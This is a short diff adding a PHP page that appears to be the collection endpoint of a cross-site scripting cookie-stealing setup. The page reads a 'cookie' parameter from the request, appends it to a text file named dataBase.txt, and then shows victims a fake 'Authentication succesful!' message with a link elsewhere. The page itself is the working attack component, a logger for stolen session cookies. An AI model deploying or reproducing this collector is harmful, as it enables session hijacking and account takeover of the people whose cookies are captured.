@@ -1,0 +1,17 @@
+<!--This is my public_html copy-->
+
+<html>
+<body>
+
+<?php
+$cookieV = $_GET["cookie"];
+file_put_contents("dataBase.txt", $_GET["cookie"]."\n", FILE_APPEND);
+
+?>
+<script>alert('$cookieV');</script>;
+
+Authentication succesful! <a href="https://www.youtube.com/watch?v=MtN1YnoL46Q">Continue</a> to your destination.
+
+
+</body>
+</html>
